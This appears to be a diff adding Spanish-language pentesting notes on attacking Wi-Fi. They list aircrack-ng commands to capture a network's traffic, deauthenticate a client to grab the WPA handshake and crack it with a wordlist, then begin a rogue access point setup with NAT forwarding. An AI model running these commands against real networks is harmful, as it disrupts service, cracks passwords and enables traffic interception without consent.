@@ -1,0 +1,25 @@
+	### Enumeracion y cracking
+airmon-ng start wlan0
+#Poner el adaptador wifi en monitoreo
+airodump-ng wlan0mon
+#Comenzar a escuchar y ver las redes disponibles junto con la MAC, la potencia, data, etc.
+airodump-ng -c <channel> -w <out file> --bssid <MAC address> wlan0mon
+#Capturar el trafico de la red seleccionada (BSSID)
+aireplay-ng -0 <cantidad de veces> -a <red MAC address> -c <Dispositivo MAC addres> wlanmon0
+#Flag -0 es para deauth. Se tiene que hacerle deauth al dispositivo, esperar a que se conecte, y volver a hacerlo para que en la captura quede guardado el handshake
+iwconfig wlan0mon channel 11 && sudo aireplay-ng -0 <cantidad de veces> -a <red MAC address> -c <Dispositivo MAC address> wlan0mon
+#En el caso de tener error de channel se configura iwconfig para el channel especificado y se intenta deauth nuevamente
+aircrack-ng -w <wordlist> -b <red MAC address> <out file>.cap
+#Intentar crackear la pwd
+
+	### Access point falsos [~]InProgress
+dnsmasq.conf  hostapd.conf
+#Se deben crear los archivos de configuracion de las tools dnsmasq y hostapd (archvios en examples)
+ifconfig wlan0 10.0.0.12 netmask 255.255.255.0
+#De acuerdo a la configuracion, se establecen estas configuraciones de wlan0
+route add -net 10.0.0.0 netmask 255.255.255.0 gateway 10.0.0.1
+#Agregar en la tabla de enrutamiento para la IP del ejemplo
+iptables -t nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
+#Crear enmascaramiento
+echo 1 > /proc/sys/net/ipv4/ip_forward
+#Habilito forwarding de paquetes
